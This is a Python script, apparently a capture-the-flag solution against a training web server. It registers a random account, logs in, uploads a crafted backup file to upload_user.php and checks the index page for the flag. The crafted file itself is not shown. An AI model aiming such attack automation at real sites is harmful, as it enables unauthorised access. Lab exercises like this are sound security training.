import requests
import random
import string
import threading
import time

base_url = "http://meta.training.jinblack.it"

def register(username, password, s):
    url = "%s/register.php" % base_url
    data = {"username":username, "password_1":password, "password_2":password, "reg_user": ''}
    response = s.post(url, data=data)

def login(username, password, s):
    url = "%s/login.php" % base_url
    data = {"username":username, "password":password, "log_user": ''}
    response = s.post(url, data=data)

def index(s):
    url = "%s/index.php" % base_url
    response = s.get(url)
    if "flag" in response.text:
        print(response.text)

def upload_user(s):
    url = "%s/upload_user.php" % base_url
    files = {'user_bak': open("flag.txt", "rb")}
    response = s.post(url, files=files)

def logout(s):
    url = "%s/logout.php" % base_url
    response = s.get(url)

random_username = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
random_password = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))


s = requests.Session()
register(random_username, random_password, s)
login(random_username, random_password, s)
upload_user(s)
index(s)
#logout(s)